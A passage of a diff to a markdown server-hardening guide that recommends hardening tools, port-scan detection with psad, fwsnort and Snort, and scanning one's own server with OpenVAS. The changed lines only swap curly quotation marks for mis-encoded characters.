 1. Set-up your `CNAME` or what ever type of `DNS` record you are using
 2. Now remember, keeping any machine on (not just the internet, but any) a network requires constant consideration and effort in keeping the system as secure as possible.
 3. [Work through](https://www.debian.org/doc/manuals/securing-debian-howto/ch-automatic-harden.en.html#s6.1) using the likes of [harden](https://packages.debian.org/wheezy/harden) and [Lynis](https://cisofy.com/lynis/) for your server and [harden-surveillance](https://packages.debian.org/wheezy/harden-surveillance) for monitoring your network.
-4. Consider combining “Port Scan Attack Detector” ([psad](https://packages.debian.org/stretch/psad)) with [fwsnort](https://packages.debian.org/stretch/fwsnort) and Snort.
-5. Hack your own server and find the holes before someone else does. If you are not already familiar with the tricks of how systems on the internet get attacked, read up on the “[Attacks and Threats](http://www.tldp.org/HOWTO/Security-Quickstart-HOWTO/appendix.html#THREATS)”, Run [OpenVAS](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#vulnerability-scanners), Run [Web Vulnerability Scanners](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#web-vulnerability-scanners) 
+4. Consider combining â€œPort Scan Attack Detectorâ€ ([psad](https://packages.debian.org/stretch/psad)) with [fwsnort](https://packages.debian.org/stretch/fwsnort) and Snort.
+5. Hack your own server and find the holes before someone else does. If you are not already familiar with the tricks of how systems on the internet get attacked, read up on the â€œ[Attacks and Threats](http://www.tldp.org/HOWTO/Security-Quickstart-HOWTO/appendix.html#THREATS)â€, Run [OpenVAS](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#vulnerability-scanners), Run [Web Vulnerability Scanners](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#web-vulnerability-scanners) 
 
 ## 4. SSM Risks that Solution Causes {#vps-risks-that-solution-causes}
 > Are there any? If so what are they?
